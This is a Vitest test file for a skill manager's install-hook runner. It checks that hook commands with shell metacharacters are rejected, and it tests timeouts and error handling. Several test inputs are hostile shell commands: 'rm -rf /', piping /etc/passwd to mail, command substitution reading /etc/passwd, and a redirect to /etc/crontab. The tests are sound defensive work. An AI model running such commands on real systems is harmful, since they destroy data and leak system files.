import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { GoodBoyManifest } from '../types/index.js';

// Explicit factory — avoids copying util.promisify.custom from Node's real execFile,
// which would cause promisify() to bypass our mock entirely.
vi.mock('node:child_process', () => ({ execFile: vi.fn() }));

import { execFile } from 'node:child_process';
import { runHooks } from './hooks.js';

const mockExecFile = vi.mocked(execFile);

const BASE: GoodBoyManifest = {
  name: 'test-skill',
  version: '0.1.0',
  description: 'Test skill',
  author: { name: 'Test Author' },
  license: 'MIT',
  entry: 'index.ts',
  language: 'typescript',
  schema_version: '1.0.0',
  status: 'experimental',
};

const CTX = { skillName: 'test-skill', skillPath: '/tmp/test-skill' };

function withHook(hookName: keyof NonNullable<GoodBoyManifest['hooks']>, cmd: string): GoodBoyManifest {
  return { ...BASE, hooks: { [hookName]: cmd } };
}

function setupSuccess(): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') cb(null, '', '');
  });
}

function setupFailure(message: string): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') cb(new Error(message));
  });
}

function setupTimeout(useKilled = true): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') {
      const err = Object.assign(new Error('Process killed'), {
        killed: useKilled,
        code: useKilled ? undefined : 'ETIMEDOUT',
      });
      cb(err);
    }
  });
}

function setupNonErrorThrow(): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') cb('string error, not an Error instance');
  });
}

// ---------------------------------------------------------------------------
// Command validation (parseHookCommand) — throws BEFORE execFile is called
// ---------------------------------------------------------------------------

describe('runHooks() — command validation', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // FORBIDDEN_CHARS: /[&|;`$(){}<>\\"']/

  it('rejects && (shell injection via &)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js && rm -rf /'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects | (pipe)', async () => {
    await expect(runHooks(withHook('postinstall', 'cat /etc/passwd | mail a@b.com'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects ; (semicolon command separator)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js; rm -rf /'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects $(...) (dollar subshell expansion)', async () => {
    await expect(runHooks(withHook('postinstall', 'node $(cat /etc/passwd)'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects ` (backtick subshell expansion)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup`evil`.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects > (output redirect)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js > /etc/crontab'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects < (input redirect)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js < /etc/passwd'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects { (brace grouping)', async () => {
    await expect(runHooks(withHook('postinstall', 'node { echo evil; }'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects ( (subshell grouping)', async () => {
    await expect(runHooks(withHook('postinstall', 'node (evil)'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects a command exceeding the 256-character limit', async () => {
    // "node " (5) + 252 "a"s = 257 chars > 256
    const longCmd = 'node ' + 'a'.repeat(252);
    expect(longCmd.length).toBe(257);
    await expect(runHooks(withHook('postinstall', longCmd), ['postinstall'], CTX))
      .rejects.toThrow('Hook command exceeds the maximum allowed length of 256 characters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('accepts a command exactly at the 256-character limit', async () => {
    setupSuccess();
    const maxCmd = 'node ' + 'a'.repeat(251);
    expect(maxCmd.length).toBe(256);
    await expect(runHooks(withHook('postinstall', maxCmd), ['postinstall'], CTX))
      .resolves.toBeUndefined();
  });

  it('rejects an empty hook command string', async () => {
    await expect(runHooks(withHook('postinstall', '   '), ['postinstall'], CTX))
      .rejects.toThrow('Hook command is empty');
    expect(mockExecFile).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Execution dispatch — what runHooks calls and how errors are mapped
// ---------------------------------------------------------------------------

describe('runHooks() — execution', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('skips hooks not listed in hookNames', async () => {
    setupSuccess();
    const manifest = withHook('preinstall', 'node --version');
    await runHooks(manifest, ['postinstall'], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('does nothing when the manifest has no hooks object', async () => {
    await runHooks(BASE, ['postinstall'], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('does nothing when the requested hook is not defined on the manifest', async () => {
    const manifest: GoodBoyManifest = { ...BASE, hooks: { preinstall: 'node --version' } };
    await runHooks(manifest, ['postinstall'], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('calls execFile with the binary and args split correctly', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node --version'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      'node',
      ['--version'],
      expect.objectContaining({ timeout: 30_000, cwd: CTX.skillPath }),
      expect.any(Function),
    );
  });

  it('calls execFile with cwd set to context.skillPath', async () => {
    setupSuccess();
    const ctx = { skillName: 'my-skill', skillPath: '/custom/path' };
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], ctx);
    expect(mockExecFile).toHaveBeenCalledWith(
      'node',
      ['setup.js'],
      expect.objectContaining({ cwd: '/custom/path' }),
      expect.any(Function),
    );
  });

  it('calls execFile with a 30-second timeout', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(Array),
      expect.objectContaining({ timeout: 30_000 }),
      expect.any(Function),
    );
  });

  it('runs multiple hooks in the order specified by hookNames', async () => {
    setupSuccess();
    const calls: string[] = [];
    mockExecFile.mockImplementation((...args: any[]) => {
      calls.push(args[0] as string);
      const cb = args[args.length - 1];
      if (typeof cb === 'function') cb(null, '', '');
    });
    const manifest: GoodBoyManifest = {
      ...BASE,
      hooks: {
        preinstall: 'alpha',
        postinstall: 'beta',
      },
    };
    await runHooks(manifest, ['preinstall', 'postinstall'], CTX);
    expect(calls).toEqual(['alpha', 'beta']);
  });

  it('resolves without calling execFile when hookNames is empty', async () => {
    await runHooks(withHook('postinstall', 'node setup.js'), [], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('throws `Hook "X" failed: <first line>` on non-timeout failure', async () => {
    setupFailure('command not found\nat some stack frame');
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" failed: command not found');
  });

  it('does not expose inner stack trace lines in failure messages', async () => {
    setupFailure('first line\n    at Object.<anonymous> (hidden.js:1)\n    at ...more');
    const err = await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX)
      .catch((e: unknown) => e as Error);
    expect(err.message).not.toContain('at Object');
    expect(err.message).not.toContain('hidden.js');
  });

  it('throws `Hook "X" timed out` when killed:true', async () => {
    setupTimeout(true);
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" timed out after 30 seconds');
  });

  it('throws `Hook "X" timed out` when code is ETIMEDOUT', async () => {
    setupTimeout(false);
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" timed out after 30 seconds');
  });

  it('throws `Hook "X" failed` when a non-Error is thrown', async () => {
    setupNonErrorThrow();
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" failed');
  });

  it('stops execution after the first failing hook', async () => {
    setupFailure('first hook failed');
    const manifest: GoodBoyManifest = {
      ...BASE,
      hooks: { preinstall: 'node first.js', postinstall: 'node second.js' },
    };
    await runHooks(manifest, ['preinstall', 'postinstall'], CTX).catch(() => {});
    expect(mockExecFile).toHaveBeenCalledOnce();
  });
});
